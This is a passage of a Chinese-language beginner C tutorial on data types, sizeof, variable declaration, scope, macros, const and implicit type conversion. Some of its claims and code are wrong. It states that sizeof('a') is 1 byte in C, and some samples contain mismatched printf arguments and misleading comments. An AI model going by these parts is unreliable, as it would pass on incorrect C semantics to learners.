class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> c=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;char c: %u\n&quot;</span>,<span class="keyword">sizeof</span>(c));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;char: %u\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;int: %u\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\&#x27;a\&#x27;: %u\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&#x27;a&#x27;</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\&#x27;a\&#x27;+1: %u\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&#x27;a&#x27;</span> + <span class="number">1</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\&#x27;a\&#x27;+1: %u\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&#x27;a&#x27;</span> + <span class="string">&#x27;a&#x27;</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出结果:</span></span><br><span class="line"><span class="comment">char: 1</span></span><br><span class="line"><span class="comment">int: 4</span></span><br><span class="line"><span class="comment">&#x27;a&#x27;: 1</span></span><br><span class="line"><span class="comment">&#x27;a&#x27;+1: 4</span></span><br><span class="line"><span class="comment">&#x27;a&#x27;+1: 4</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>这里使用sizeof关键字计算操作数的大小(宽度),也就是占用几字节.</p><p>可以发现,单个字符常量/单个字符变量都占用1字节,而int常量(变量)占用4字节</p><p>但是,一旦char加入了和int整型的运算,那么结果的大小就会立即变成4字节</p><p>甚至只是两个字符常量进行相加(字符对应的ASCII码值相加,而不是连接),结果也立即提升为4字节</p><p>所以我们可以证实:<code>在C语言中,单个的字符常量是1个字节,但是一旦参与运算,就立即提升为4字节,也就是说被解释为(当做)4字节的int常量参与运算</code></p><p>换句话说,你完全可以把C语言中的字符常量当成int来看待!!!这是一个很重要的特性,很多教材,书中都没有提到,或者讲解的不够清晰.</p><h2 id="其他特殊类型">其他特殊类型</h2><p>其他的特殊类型非常重要,但是这里先不进行讲解,本文的主要目的是要让各位建立起对数据类型及其表示范围的概念,后面的几种类型会单独分章节进行讨论,特别是指针,堪称C语言的灵魂,放在好几章里讲解都不为过,甚至在后面的各种应用都离不开指针.</p><h1 id="c语言的数据">C语言的数据</h1><p>C语言中,数据有两种,即常量和变量;</p><p>还有一种实际上属于变量,但是常常被称为常量,或者常变量的数据,就是在变量声明的适当位置加上const这个关键字;</p><p>另外有一种特殊的常量,叫做宏定义,实际上是一种预处理,只是单纯的文本替换,同样十分重要.</p><h2 id="如何声明一个变量">如何声明一个变量</h2><p>注:有关声明的详细内容可见https://zh.cppreference.com/w/c/language/declarations,其他声明将会在后续知识的讲解中逐渐插入.</p><p>变量,顾名思义,就是可以变化的量,用于在程序中存储不断变化的值,或者用于接受我们输入的值(在运行前不确定).</p><p>并且变量不同于常量,在使用前必须进行声明—提前告知编译器这里需要使用到一个变量(需要进行内存分配).</p><p>如前所述,C语言是静态类型语言,声明一个变量,则必须声明其类型(编译前就必须确定其类型):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a; <span class="comment">// 正确,a是一个int类型的变量</span></span><br><span class="line"><span class="type">double</span> pi=<span class="number">3.14</span>; <span class="comment">// 正确,pi是一个double类型的变量,并为其初始化为3.14</span></span><br><span class="line">    <span class="type">float</span> f1=<span class="number">2</span>,f2=<span class="number">3</span>,f3=<span class="number">4</span>; <span class="comment">// 正确,同一条语句中可以声明若干个变量</span></span><br><span class="line">    s; <span class="comment">// 错误,s未定义</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2lf&quot;</span>,pi); <span class="comment">// 输出pi的值,且保留2位小数</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="变量的声明方法">变量的声明方法</h3><p>一个变量声明,遵循以下格式:</p><p>​<code>&lt;类型&gt; &lt;合法的标识符名&gt;;</code></p><p>类型即为上面所述的各种合法的内置类型,或者是自定义的类型(例如结构体类型,枚举类型等等);</p><h3 id="标识符的命名规则">标识符的命名规则</h3><p>这里再重新说明一下:</p><p>标识符即为变量名,在C语言中,标识符的命名有如下几条规则,不遵循这几条规则的标识符均不合法(或者不合适):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> 标识符必须以字母a-z、 A-Z或下划线开头，后面可跟任意个(可为<span class="number">0</span>)字符，这些字符可以是字母、下划线和数字，其他字符不允许出现在标识符中</span><br><span class="line"><span class="number">2</span> 标识符严格区分大小写字母</span><br><span class="line"><span class="number">3</span> 标识符的长度，c89规定<span class="number">31</span>个字符以内，c99规定<span class="number">63</span>个字符以内(没有哪个疯子超出这个范围吧...)</span><br><span class="line"><span class="number">4</span> C语言中的关键字，有特殊意义，不能作为标识符(例如<span class="keyword">if</span>,<span class="keyword">for</span>,<span class="keyword">while</span>,<span class="keyword">goto</span>,<span class="keyword">return</span>等)</span><br><span class="line"><span class="number">5</span> 自定义标识符最好取具有一定意义的字符串，便于记忆和理解</span><br><span class="line"><span class="number">6</span> 不同平台最好遵循各自的命名规范,例如Windows一般使用驼峰命名法,Linux使用下划线命名法</span><br></pre></td></tr></table></figure><p>不好意思地指出,本人的英语水平不太好,而且各种标识符(包括但不限于变量名,函数名,结构体类型,宏定义等)都习惯下划线命名法,可能较长.但希望宁肯变量名长点,也不要一大堆a,b,c,d,e,f,g之类的扔上去,否则以后回头看代码遭罪的只会是你自己.</p><h3 id="变量从哪里声明">变量从哪里声明</h3><p>这里的知识可能涉及到一点作用域和生命周期的问题,但是这里先不讲解—依旧,知识都是交叉的,在该讲什么的时候就讲什么.</p><p>其实核心的就是一句话:<code>在你使用到该变量之前提前声明好他</code></p><p>例如上面的<code>double pi=3.14;</code>我们需要在后面进行输出其值,所以必须在使用printf之前进行该变量的声明,同时对其进行初始化(初始化为3.14).这里的pi在main函数中声明,所以pi也叫<code>局部变量</code>,换句话说,在其他地方(其他函数中)是不允许使用该变量的(找不到pi),因为pi是main()函数私有的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;访问到了pi:%lf&quot;</span>,pi); <span class="comment">// error: &#x27;pi&#x27; was not declared in this scope</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> pi=<span class="number">3.14</span>; <span class="comment">// 正确,pi是一个全局的double类型的变量,并为其初始化为3.14,main函数可以访问到</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2lf\n&quot;</span>,pi); <span class="comment">// 输出pi的值,且保留2位小数</span></span><br><span class="line">    test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这个程序无法通过编译,因为在test函数中无法访问到pi这个变量.</p><p>但是如果我们把pi放在main()函数的前面,同时在任何函数的外面,那么pi就成为了全局变量,任何函数(本源文件内)都有权限访问修改其值,并且pi在程序运行的整个过程一直存在而不会销毁(后面在作用域与生命周期的相关教程会详细解释):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">double</span> pi; <span class="comment">// 正确,pi是一个全局的double类型的变量,并为其初始化为3.14,main函数可以访问到</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;访问到了pi:%lf&quot;</span>,test);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2lf\n&quot;</span>,pi); <span class="comment">// 输出pi的值,且保留2位小数</span></span><br><span class="line">    test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230921202743779.png" alt="image-20230921202743779" style="zoom:33%;" /><p>这里的示例主要体现了两种pi的作用域的不同,暂未展示生命周期的问题,大家现在只需要知道:如果需要一个变量给所有的函数共享,那么请将他作为全局变量,但是,这种操作一定要慎重,除非迫不得已,最好不要将任何变量声明为全局变量—你有可能会在某个函数中不小心修改(破坏)其值—请绝对不要高估你的实力与判断.</p><h2 id="如何使用一个常量">如何使用一个常量</h2><h3 id="常量和变量的区别">常量和变量的区别</h3><p>其实这个问题很显而易见,常量就是不能(或者说不应该)被修改值的量,从逻辑的角度去想,如果某个要被使用到的值确定不会(甚至是绝对不能)被修改(例如宇宙的普朗克常量),那么何不将其直接作为常量写入呢,这是一种思路,下面按照这个思路来写一个求圆表面积的程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> r=<span class="number">3</span>; <span class="comment">// 用于存储半径</span></span><br><span class="line"><span class="type">double</span> c; <span class="comment">// 用于存储面积</span></span><br><span class="line">c=<span class="number">3.14</span>*r*r;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lf&quot;</span>,c); <span class="comment">//输出28.260000</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>3.14</code>就是一个浮点型的常量,我们直接将其硬编码到程序中.</p><p>但是有一个问题,如果我们手动指定pi的精度,那么pi就不得不每次进行修改,例如3.14,3.14159,3.1415926535,…如此直接修改程序就显得非常麻烦,而且每一个地方都要进行手动修改,十分繁琐,与其这样,我们还不如将其定义为一个变量.</p><p>但是不得不承认,这里的例子破坏了<code>常量就是不能(或者说不应该)被修改值的量</code>这个前提,但是我们为了说明问题,暂时违反一次…另一方面,我们并不是只有这两种选择,在C中,我们有一种特殊的定义&quot;常量&quot;的方法,那就是<code>宏定义</code>.</p><p>宏定义实际上只是完完全全的文本替换,他类似于你在文本编辑器中&quot;ctrl+h&quot;进行批量的文本替换,我们见如下示例:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.14</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> r=<span class="number">3</span>; <span class="comment">// 用于存储半径</span></span><br><span class="line"><span class="type">double</span> c; <span class="comment">// 用于存储面积</span></span><br><span class="line">c=PI*r*r;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lf\n&quot;</span>,c); <span class="comment">//输出 28.260000</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;PI的值为:%lf\n&quot;</span>,PI); <span class="comment">//输出 PI的值为:3.140000</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>宏定义的定义格式是这样:</p><p><code>#define &lt;宏名&gt; [要替换的内容,可为空]</code></p><p>那么在上面的代码中,我们将程序中所有的PI全部替换成3.14</p><p>可以发现,宏定义实际上是预处理指令(#号代表预处理),也就是说在编译前宏就已经被替换了,所以说宏只是单纯的文本替换</p><p>另一方面,宏处理是从上向下依次执行的,如果先执行的宏替换之后,替换的地方又出现了后执行的宏需要替换的地方,那么这个地方仍然会被再次进行处理,以此类推,直到所有的宏全部被替换完成.</p><p>关于宏的知识还有其他内容,有的用的比较少,有的现在还不能讲解,读者不妨自行查阅—例如&quot;宏函数&quot;,“拼接宏”,&quot;递归宏&quot;等等高级(抽象)用法,有些其实基本不会用到,而有些会常常用到,需要不断的代码积累.</p><h3 id="常量有哪些">常量有哪些</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923162631074.png" alt="image-20230923162631074"></p><p>实际上很简单的说,单个的数字(例如<code>123</code>,<code>3</code>等),单个的字符(例如<code>'a'</code>),单个的字符串(例如<code>&quot;hello world&quot;</code>),一些编译器预先定义好的常量(例如<code>NULL,其值是0</code>)这些都是合法的常量(或字面量)</p><h3 id="常量的存储问题">常量的存储问题</h3><p>接下来是常量的存储问题.和变量不同,常量存储在常量存储区,而不是像局部变量存储在栈区,全局,静态变量存储在全局(静态)存储区里等等.</p><p>而且字符串是在一个字符常量区中,而且对字符串常量的引用(注意不是C++的引用,而是指使用),实际上是一个指向字符串第一个字符的字符指针,而且一个C程序共享同一个字符串常量—这意味着如果两个字符指针指向同一个字符串常量,那么在内存中实际只有一个这个字符串常量的副本!!!更重要的是,对一个字符串常量进行修改的行为是未定义的!!!有关字符指针的内容会在指针或字符串的相关章节进行详细的讲解(一般的教材是不会讲的doge)</p><h3 id="介于常量和变量之间-常变量的使用">介于常量和变量之间—常变量的使用</h3><p>常变量实质上就是变量,我们使用一个const关键字对变量进行修饰,让他的值不能够被修改:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> S </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> num=<span class="number">10</span>; <span class="comment">// num的值不可被修改</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,num);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>const提供语言层面的保护,编译器会进行一定程度上的识别,如果有修改的行为会进行报错—除了使用指针进行强行修改,但是此时一般程序会直接终止.</p><p>关于const关键字相关的知识将在指针进行更加详细的讲解.</p><p>​—WAHAHA,2023.9.21</p><h1 id="如何使用数据">如何使用数据</h1><p>在此处,我们先引入最基本的几个运算:<code>加减乘除和赋值</code></p><p>对于数据,必然要进行操作使用,我们可以使用最基本两种操作方式:</p><p>1.变量或常量之间可以进行组合运算,例如<code>加减乘除</code>等,并计算出一个最终的值</p><p>3.把计算出的最终的值<code>赋值</code>给一个<code>左值</code>(后面会介绍到左值,这里简单将左值理解为就是<code>变量</code>)</p><h2 id="变量的初始化">变量的初始化</h2><p>数据的操作处理,主要和变量有关,常量作为辅助.那么一个变量,在进行操作之前,应当给他一个初始的值,我们把这种操作叫做<code>初始化</code>.</p><p>例如,我们想要定义一个pi的浮点型变量,并初始化为3.14,应该这样写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">float</span> pi = <span class="number">3.14</span>;</span><br></pre></td></tr></table></figure><p>也就是说,我们在声明这个变量的同时,直接在pi这个标识符后面跟一个<code>=</code>运算符,后面再跟其初始值即可.</p><p>这里的<code>=</code>叫做<code>赋值运算符</code>, 它的功能是将其右边的&quot;值&quot;赋值给左边的&quot;变量&quot;.</p><p>另一方面,必须要注意的是,赋值运算符在这里实际上并不是赋值的操作,虽然我们使用了<code>=运算符</code>—这显然很符合我们的思维,但是正如标题所写,这里的操作叫做<code>初始化</code>而非<code>赋值</code>!</p><h2 id="为变量赋值">为变量赋值</h2><p>我们在程序的运行当中,一些变量的值会发生变化,也就是说需要重新给他赋一个新的值,那么这时候的操作就叫做<code>赋值</code>,这里使用的<code>=运算符</code>才是真正的赋值含义.</p><p>这里仅仅先知道我们使用<code>=运算符</code>(C语言中这种用于运算操作的符号统称为运算符)对一个变量进行赋值即可.</p><p>例如,我们定义的一个变量原来是3,此时我们想要将其重新变为4,应该这样写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> var = <span class="number">3</span>; <span class="comment">// 这里是初始化而非赋值</span></span><br><span class="line">var = <span class="number">4</span>; <span class="comment">// 这里进行赋值</span></span><br></pre></td></tr></table></figure><h2 id="变量-常量间进行运算">变量/常量间进行运算</h2><p>注:由于仅仅学了几种基本类型,我们仅拿四则运算的运算符来举例,实际上C语言支持的运算符远远不仅于此.</p><p>很显然,我们使用<code>+-*/</code>这4个运算符进行<code>四则运算</code>,他们的运算行为和数学意义完全相同,例如如果除数是0则会出现错误.</p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>, b = <span class="number">4</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a + b); <span class="comment">// 计算结果是一个int类型值,因此使用%d输出</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然,输出的结果是<code>7</code></p><p>又如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">8</span>, b = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a / b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然,输出的结果是<code>4</code></p><br><p>再例如我们想要计算浮点数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> a = <span class="number">3</span>, b = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lf&quot;</span>, a / b); <span class="comment">// 计算结果是一个double类型值,因此使用%lf输出</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者使用float(精度要求较低时):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">float</span> a = <span class="number">3</span>, b = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%f&quot;</span>, a / b); <span class="comment">// 计算结果是一个float类型值,因此使用%f输出</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注:实际上<code>printf()</code>函数会将所有的float类型值<code>提升</code>为double类型,因此用<code>%lf</code>输出float类型值也没有问题.</p><br><p>另外,我们可以连续进行使用:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>, b = <span class="number">2</span>, c = <span class="number">5</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a + b * c); <span class="comment">// 输出结果为13</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这里我们也能看出四则运算和其数学意义相同,乘除法的优先级依旧高于加减法,所以结果是13.</p><p>那么如果想要强制先运算<code>a+b</code>,我们加上小括号即可,同时小括号可嵌套使用!</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>, b = <span class="number">2</span>, c = <span class="number">5</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, (a + b) * c); <span class="comment">// 输出结果为25</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里涉及到<code>运算符的优先级</code>,同样,现在进行详细讲解还为时过早.</p><h2 id="两种类型转换">两种类型转换</h2><p>前面我们分别举了整型计算和浮点型计算的例子,那么问题来了,这个程序输出的是什么:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>, b = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a / b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你觉得输出的是<code>1.5</code>,那么很遗憾,你完全忽略了上面讲的数据类型的知识!</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923155340995.png" alt="image-20230923155340995" style="zoom:33%;" /><p>运行结果可能出乎你的预料,是<code>1</code>!原因很简单,a和b都是int类型,那么很自然的,C语言没有理由自动的为你将a/b作为一个double类型的值,而是只会是一个int,那么实际上1.5的0.5被忽略了,而且是直接舍弃,没有四舍五入.</p><p>换句话说, <code>/运算符</code>对于int变量,执行的叫做<code>整除</code>,这里的<code>a/b相当于[a/b],这里的[]代表向下取整</code>.</p><p>那么解决的办法也很简单,使用类型转换.</p><h3 id="隐式类型转换">隐式类型转换</h3><p>将a或b中的其中任何一个声明为double即可(或者两个都是double),此时,C语言会有一个<code>类型提升</code>,也就是说,其中那个精度较低的变量(int类型的那一个)会被提升为和另一个变量相同的精度更高的类型(double),此时,double类型的值就可以保留浮点:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> a = <span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">2</span>; <span class="comment">// 这里将a声明为double</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lf&quot;</span>, a / b); <span class="comment">// 注意此时需要用%lf来输出浮点数!!!</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923160409779.png" alt="image-20230923160409779" style="zoom:33%;" /><p>这里的&quot;类型提升&quot;实际上是一个<code>隐式类型转换</code>,顾名思义,C程序默默地将b提升为double.</p><p>转换对应的两种类型必须能够互相转换,否则会报错,例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>, *p = &amp;a;</span><br><span class="line"><span class="type">double</span> b = <span class="number">3</span>;</span><br><span class="line">b = p; <span class="comment">// 错误,int*类型的指针值不能转换为double类型</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lf&quot;</span>, a); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过,如果一种类型的值赋值给另一种类型的变量,如果可以转换过去的话,那么将不会报错,而是可能产生一个警告,但可以通过编译.</p><p>另外,必须注意的是,从高精度值向低精度值转换会损失信息:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> pi = <span class="number">3.14</span>; <span class="comment">// 这里a声明为double</span></span><br><span class="line"><span class="type">int</span> b = pi*<span class="number">2</span>; <span class="comment">// 本意是让b存储2倍的pi</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, b); <span class="comment">// 注意此时需要用%d来输出b!</span></span><br><span class="line"><span class="comment">// 但是输出结果为6,小数部分丢失!</span></span><br><span class="line"><span 